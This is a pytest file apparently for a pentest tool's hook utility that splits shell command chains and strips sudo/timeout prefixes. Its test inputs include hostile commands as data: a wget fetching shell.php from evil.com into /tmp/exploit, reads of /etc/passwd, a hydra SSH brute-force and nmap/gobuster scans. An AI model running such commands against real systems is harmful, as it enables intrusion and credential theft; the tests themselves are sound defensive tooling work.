"""Tests for command_utils — shared shell command splitting utility."""

import sys
from pathlib import Path

import pytest

# Add hooks to path
sys.path.insert(0, str(Path(__file__).parent.parent.parent / "infrastructure" / "PrEP" / "hooks"))

from command_utils import extract_commands, strip_prefixes


# =============================================================================
# extract_commands — basic splitting
# =============================================================================


class TestExtractCommandsBasicSplitting:
    """Test splitting on &&, ||, ; operators."""

    def test_single_command(self):
        assert extract_commands("ls -la") == ["ls -la"]

    def test_and_operator(self):
        assert extract_commands("cd /tmp && ls") == ["cd /tmp", "ls"]

    def test_or_operator(self):
        assert extract_commands("test -f /etc/hosts || echo missing") == [
            "test -f /etc/hosts",
            "echo missing",
        ]

    def test_semicolon(self):
        assert extract_commands("echo hello; cat /etc/passwd") == [
            "echo hello",
            "cat /etc/passwd",
        ]

    def test_mixed_operators(self):
        result = extract_commands("echo test || curl http://10.0.0.1 && whoami")
        assert result == ["echo test", "curl http://10.0.0.1", "whoami"]

    def test_pipe_preserved(self):
        """Pipe is NOT a separator — piped commands are a single logical unit."""
        assert extract_commands("nmap 10.0.0.1 | grep open") == [
            "nmap 10.0.0.1 | grep open"
        ]

    def test_empty_string(self):
        assert extract_commands("") == []

    def test_whitespace_only(self):
        assert extract_commands("   ") == []

    def test_none_like(self):
        assert extract_commands("") == []


# =============================================================================
# extract_commands — prefix stripping
# =============================================================================


class TestExtractCommandsPrefixStripping:
    """Test that sudo/timeout/etc. wrappers are stripped."""

    def test_sudo_stripped(self):
        assert extract_commands("sudo nmap -sV 10.0.0.1") == ["nmap -sV 10.0.0.1"]

    def test_timeout_stripped(self):
        assert extract_commands("timeout 30 hydra -l admin -P pass.txt ssh://10.0.0.1") == [
            "hydra -l admin -P pass.txt ssh://10.0.0.1"
        ]

    def test_sudo_timeout_combined(self):
        result = extract_commands("sudo timeout 60 gobuster dir -u http://10.0.0.1 -w wl.txt")
        assert result == ["gobuster dir -u http://10.0.0.1 -w wl.txt"]

    def test_timeout_with_suffix(self):
        result = extract_commands("timeout 30s nmap -p- 10.0.0.1")
        assert result == ["nmap -p- 10.0.0.1"]


# =============================================================================
# extract_commands — quote handling
# =============================================================================


class TestExtractCommandsQuoteHandling:
    """Test that operators inside quotes are NOT treated as separators."""

    def test_single_quotes(self):
        result = extract_commands("echo 'hello && world'; ls")
        assert len(result) == 2
        assert "hello && world" in result[0]
        assert result[1] == "ls"

    def test_double_quotes(self):
        result = extract_commands('echo "semi;colon"; pwd')
        assert len(result) == 2
        assert "semi;colon" in result[0]
        assert result[1] == "pwd"


# =============================================================================
# extract_commands — real-world pentest commands
# =============================================================================


class TestExtractCommandsRealWorld:
    """Test with realistic command chains from pentest sessions."""

    def test_cd_and_git_log(self):
        """The original false-positive case from issue #2."""
        result = extract_commands("cd /tmp/source && git log --oneline -n 20")
        assert result == ["cd /tmp/source", "git log --oneline -n 20"]

    def test_nmap_chain(self):
        result = extract_commands(
            "sudo nmap -sV -sC -oA scan 10.0.0.1 && cat scan.nmap | grep open"
        )
        assert len(result) == 2
        assert result[0] == "nmap -sV -sC -oA scan 10.0.0.1"
        assert "grep open" in result[1]

    def test_directory_creation_chain(self):
        result = extract_commands("mkdir -p /tmp/exploit && cd /tmp/exploit && wget http://evil.com/shell.php")
        assert len(result) == 3


# =============================================================================
# strip_prefixes — direct tests
# =============================================================================


class TestStripPrefixes:
    """Test the prefix stripping function directly."""

    def test_sudo(self):
        assert strip_prefixes("sudo ls /root") == "ls /root"

    def test_empty(self):
        assert strip_prefixes("") == ""

    def test_no_prefix(self):
        assert strip_prefixes("nmap -sV 10.0.0.1") == "nmap -sV 10.0.0.1"

    def test_sudo_with_user(self):
        assert strip_prefixes("sudo -u www-data cat /etc/passwd") == "cat /etc/passwd"
